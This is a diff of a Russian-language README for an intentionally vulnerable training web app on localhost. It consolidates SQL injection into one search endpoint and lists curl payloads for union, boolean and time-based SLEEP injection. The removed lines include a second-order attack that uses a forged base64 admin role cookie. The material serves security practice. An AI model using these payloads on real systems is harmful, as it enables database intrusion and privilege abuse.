@@ -24,11 +24,7 @@ Swagger UI доступен на `http://localhost:8000/swagger`.
 ## Карта уязвимостей (без подсказок в интерфейсе)
 
 ### SQL Injection
-- In-Band (classic/error/union): `GET /products/search?q=...`, `GET /products/<pid>`
-- Inferential blind/boolean: `GET /api/stock?id=...`
-- Inferential time-based: `GET /api/shipping?zip=...`
-- Second-order: `GET /admin/reports?u=...` (payload хранится в `users.bio` и позже вставляется в SQL)
-- Out-of-band: можно тренировать через MySQL-функции/запросы, выполняемые в SQLi точках (зависит от среды и прав DB).
+- `GET /products/search?q=...&category=...` — единственная SQLi-точка в приложении (classic/error/union/boolean/time через разные payload'ы).
 
 ### NoSQL Injection
 - `GET|POST /product/<pid>/reviews/moderation` (фильтр модерации отзывов с JSON-like значениями)
@@ -76,33 +72,12 @@ Swagger UI доступен на `http://localhost:8000/swagger`.
 
 ### SQL Injection
 
-**In-band (`/products/search`, `/products/<pid>`):**
+**`/products/search?q=...&category=...`:**
 ```bash
-curl "http://localhost:8000/products/search?q=' OR 1=1 -- -"
-curl "http://localhost:8000/products/search?q=' UNION SELECT 1,2,3,4 -- -"
-curl "http://localhost:8000/products/1 OR 1=1"
-```
-
-**Boolean-based blind (`/api/stock`):**
-```bash
-curl "http://localhost:8000/api/stock?id=1 AND 1=1"
-curl "http://localhost:8000/api/stock?id=1 AND 1=2"
-```
-
-**Time-based blind (`/api/shipping`):**
-```bash
-curl "http://localhost:8000/api/shipping?zip=10000"
-curl "http://localhost:8000/api/shipping?zip=10000 OR SLEEP(5)"
-```
-
-**Second-order (`/admin/reports?u=...`):**
-1) Сохранить payload в `users.bio` (через `/account/profile`) например:
-```sql
-' OR 1=1 -- 
-```
-2) Вызвать:
-```bash
-curl "http://localhost:8000/admin/reports?u=alice" -b "role=YWRtaW4="
+curl "http://localhost:8000/products/search?q=' OR 1=1 -- -&category=%"
+curl "http://localhost:8000/products/search?q=' UNION SELECT 1,2,3,4,'x' -- -&category=%"
+curl "http://localhost:8000/products/search?q=test&category=electronics' OR '1'='1"
+curl "http://localhost:8000/products/search?q=' OR IF(1=1,SLEEP(3),0) -- -&category=%"
 ```
 
 ### NoSQL Injection (`/product/<pid>/reviews/moderation`)
